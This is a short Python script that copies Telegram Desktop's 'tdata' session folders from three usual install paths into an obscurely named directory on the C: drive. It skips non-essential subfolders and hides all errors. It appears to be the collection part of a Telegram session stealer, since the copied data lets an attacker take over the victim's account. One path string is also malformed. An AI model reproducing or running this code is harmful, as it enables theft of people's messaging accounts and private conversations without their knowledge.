

import os
import getpass
import shutil

path1 = 'D:\\Telegram Desktop\\tdata'
path2 = f'C:\\Users\\" + {getpass.getuser()} + "\\AppData\\Roaming\\Telegram Desktop\\tdata'
path3 = 'C:\\Program Files\\Telegram Desktop\\tdata'


directory = r'C:\hesoyam8927163\Telegram'

def Telegram():
    try:
        shutil.copytree(path1,
                directory,
                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
    except:
        pass
    try:
        shutil.copytree(path2,
                directory,
                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
    except:
        pass
    try:
        shutil.copytree(path3,
                directory,
                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
    except:
        pass
